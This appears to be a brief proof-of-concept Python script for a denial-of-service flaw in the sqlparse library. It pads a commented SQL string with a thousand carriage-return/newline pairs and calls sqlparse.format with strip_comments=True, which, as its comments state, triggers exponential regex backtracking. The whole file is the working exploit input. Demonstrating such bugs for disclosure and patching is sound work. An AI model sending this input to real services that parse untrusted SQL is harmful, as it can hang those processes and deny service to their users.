import sqlparse

# Example of how to use sqlparse with the vulnerability
sql = """
-- This is a comment
SELECT * FROM users;  -- Another comment
-- Repeated comments
""" + "\r\n" * 1000  # Adding many repetitions of '\r\n' to trigger the vulnerability

# Vulnerable usage that can cause exponential backtracking
formatted_sql = sqlparse.format(sql, strip_comments=True)
print(formatted_sql)